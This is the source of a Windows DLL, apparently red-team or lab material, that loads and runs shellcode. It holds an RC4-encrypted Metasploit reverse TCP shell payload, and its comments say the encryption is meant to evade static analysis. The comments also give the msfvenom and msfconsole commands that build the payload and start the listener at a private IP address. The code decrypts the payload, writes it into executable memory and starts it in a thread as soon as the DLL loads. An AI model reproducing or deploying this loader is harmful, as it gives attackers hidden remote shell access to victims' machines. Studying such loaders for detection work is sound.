// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

#pragma comment (lib, "bcrypt")

// Key material for RC4 decryption (we use encryption to evade static analysis)

const char key[] = "1234";

// RC4 encrypted shellcode
// Generate with:
// msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=192.168.78.129 LPORT=1982 \ 
// RC4PASSWORD='1234'--encrypt-key 1234 --encrypt rc4 -f c

BYTE scode[] =
"\xf9\x01\xf2\x4b\x03\x04\xcb\x0d\x0f\x1b\x41\x01\xa4\x37"
"\x56\x85\xf5\x70\x0c\x59\x91\x5f\x12\x57\xe3\x07\xeb\x35"
"\xe9\xef\x51\x3e\xac\x28\x4f\xa3\x99\xd7\x08\x55\x32\xee"
"\x77\x58\x95\x1a\xc4\x9f\xb3\xd9\x6f\x55\x51\xfa\x3c\x37"
"\xff\x21\xfb\x1c\x20\xde\x41\xe3\xed\xda\xd5\x83\x5f\x16"
"\x6c\xfb\x96\x5b\x27\xe2\x5c\x31\x2b\xe7\xf9\x44\x58\x76"
"\x5f\x86\x4f\xb5\x5e\x98\x88\x02\x30\x0f\x9a\x0f\xc1\x7d"
"\xfa\xf6\xf3\x00\x72\xf7\x01\xd5\xa5\x5e\xa2\xb8\x2b\x1e"
"\x81\x51\x35\x82\xb1\x0d\x40\x8f\x3c\xc8\x8d\xa3\x09\xd9"
"\x6a\x3c\x19\xb7\xac\xbb\x08\xe9\x18\x27\xea\x43\x8e\x41"
"\x7a\xa0\x73\xad\xf2\xe3\x65\x5a\x2d\x89\x93\x31\xb9\x12"
"\xdc\x18\x1e\xae\x98\x47\xd1\x80\xf7\x7b\x4a\x0e\x6a\x17"
"\xd4\x98\x47\x3e\x2d\x15\xbf\x2c\xd5\x22\xb7\xe0\x11\xf6"
"\x9e\x9c\x35\xf0\x83\xd3\xb6\x75\xed\x3f\xb1\xa5\x99\xa3"
"\x15\x01\x7b\xe9\x59\x90\x29\x50\x00\xd2\x72\x7a\xf2\xcb"
"\x69\x85\xb6\x98\x79\xae\x50\xaf\x84\x90\x0e\x29\xe2\x1b"
"\x83\x3c\xcb\xb2\x25\xd8\xc8\xbc\xb2\xfb\x6e\xee\x97\x81"
"\x8e\x8b\x3b\x9e\x4c\xc8\xd0\x6c\x9e\xfe\x78\x6a\x6b\x61"
"\x83\xfb\x68\x2f\xdb\x63\x1c\x73\x86\xd7\xdd\x6f\x05\xa8"
"\xdc\xa6\x9c\xac\xfe\xfb\x46\x36\x5d\x41\x35\xd1\xe1\xdb"
"\x59\x66\x45\x44\x56\x1b\x4b\x03\x6e\xf2\xcc\xd1\x2f\xd6"
"\x0c\x94\xf2\x83\xc5\x88\x57\xcd\x12\x1f\xb0\x59\x0f\x07"
"\xa9\x27\x79\x88\x91\xb1\xff\x89\x9b\x57\x39\x83\x27\xd2"
"\x52\x08\x86\xe1\x97\x8e\x57\xf0\xe8\xe1\xa2\xa5\x2a\x90"
"\xf6\x63\xd6\x8b\xea\x3c\x22\x24\x4c\xb8\x60\xf1\x61\x2d"
"\xe9\xa7\x6a\xb1\xee\x07\x4c\x91\xc1\xdd\x85\x62\xe1\x51"
"\x98\x77\x44\xa8\x16\x54\xe8\x16\x99\xf5\xc1\x75\xec\xba"
"\x7c\x02\x68\xaa\x5d\xdd\x07\xd8\xc3\xf1\xc0\xb4\x4b\x7a"
"\xd0\x9a\x32\xd6\xc1\xcd\x16\xcb\xfe\xcb\x0b\x24\xe4\x4a"
"\x85\xb0\x8d\xd9\xd9\xf0\x34\x83\x0f\x2c\x7f\x75\x2f\x8d"
"\x29\x48\x72\x99\x13\x3d\x13\xa0\x2a\x5c\x70\x46\x44\x46"
"\x7d\xfc\xf4\xf6\x20\x50\xf6\x1a\x3a\x3e\xda\xff\x69\xf8"
"\x76\x6b\xca\x1e\x9c\x1e\xc2\x2a\xfe\xb7\xed\x30\xb2\xcf"
"\x54\xc6\xca\xe9\xfb\xb4\x86\x7c\x39\x24\x37\xde\x12\x75"
"\x1d\x27\x43\xab\xaf\x6e\x0d\x4a\xb1\xb0\x38\x49\x11\x8a"
"\x9c\x44\x01\x22\x86\x1b\x75\x16\x5b\x93\x1e\xde\xdc\x8d"
"\x57\xd8\x18\xfd\x1e\xa2\xb5\x5b\x70\x50\xb8\x3e\xa5\x0f"
"\x4e\xc7\x51\xde\xdd\x2f\x45\x52\xd5\x43\x62\x4f\x18\xe6"
"\x4d\x2e\xa8\x47\x06\x43\x6c\x0b\x8d\xdd\x39\xe3\x91\x30"
"\x41\x77\xa1\x4e\xbf\x7c\x76\x54\x65\x07\xeb\x3a\x34\xfe"
"\x99\x19\x4b\xb8\x91\x31\x2f\xdb\x8d\x2f\x39\x32\x7e\xe5"
"\xd3\x33\x88\xc1\xae\x51\xa2\x10\x90\xba\x47\x21\x9c\xf8"
"\x82\xe2\xf8\x44\xbc\xf3\x70\x94\xcf\xc5\x6a\x5c\x49\x24"
"\xa9\x09\x51\x2b\x2d\x44\x4e\x44\x48\xe8\x3c\x74\xc4\x52"
"\x02\xc2\xc2\xf1\x3a\xc5\xe4\xcd\x67\x2d\x90\xbe\xd5\x61"
"\xe2\xc7\x7e\xd3\x4f\xb9\x03\x48\x27\x68\x1c\xac\x72\x84"
"\xd3\x09\x50\xad\x62\x1f";

// When setting the listener, use the following command:
// msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp_rc4; 
// set LHOST 192.168.78.129; set LPORT 1982; set RC4PASSWORD '1234'; run"

BOOL execute_scode()
{
    LPVOID allocated = NULL;
    SECURITY_ATTRIBUTES lpThreadAttribute = { 0 };
    HANDLE hThread = NULL;

    allocated = VirtualAlloc(NULL, sizeof(scode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocated)
    {
        printf("[-] VirtualAlloc failed\n");
        return FALSE;
    }

    if (memcpy_s(allocated, sizeof(scode), scode, sizeof(scode)) != 0)
    {
        printf("[-] memcpy_s failed\n");
        return FALSE;
    }

    hThread = CreateThread(&lpThreadAttribute, 0, (LPTHREAD_START_ROUTINE)allocated, NULL, 0, 0);
    if (!hThread)
    {
        printf("[-] CreateThread failed\n");
        return FALSE;
    }
    else
    {
        printf("[+] Shellcode execution successful\n");
    }

    DWORD res = WaitForSingleObject(hThread, INFINITE);
    printf("%d\n", res);

    return TRUE;
}

BOOL decrypt_scode()
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    PBYTE   pbKeyObject = NULL;
    DWORD   scode_size = sizeof(scode),
        key_size = strlen(key),
        cbKeyObject = 0;
    ULONG   cbWritten = 0;
    BOOL success = TRUE;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RC4_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        printf("[-] BCryptOpenAlgorithmProvider failed: 0x%08x\n", status);
        success = FALSE;
        goto cleanup;
    }

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbWritten, 0);
    if (!NT_SUCCESS(status))
    {
        printf("[-] BCryptGetProperty failed: 0x%08x\n", status);
        success = FALSE;
        goto cleanup;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject)
    {
        printf("[-] HeapAlloc failed: 0x%08x\n", status);
        success = FALSE;
        goto cleanup;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, key_size, 0);
    if (!NT_SUCCESS(status))
    {
        printf("[-] BCryptGenerateSymmetricKey failed: 0x%08x\n", status);
        success = FALSE;
        goto cleanup;
    }

    status = BCryptDecrypt(hKey, scode, scode_size, NULL, NULL, 0, scode, scode_size, &cbWritten, 0);
    if (!NT_SUCCESS(status))
    {
        printf("[-] BCryptDecrypt failed: 0x%08x\n", status);
        success = FALSE;
        goto cleanup;
    }

cleanup:
    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);

    if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);

    if (hKey)
        BCryptDestroyKey(hKey);

    return success;
}

void run()
{
    if (decrypt_scode())
        printf("[+] Shellcode decryption successful\n");
    else
        printf("[-] Shellcode decryption failed\n");

    if (!execute_scode())
        printf("[-] Shellcode execution failed\n");
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        run();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

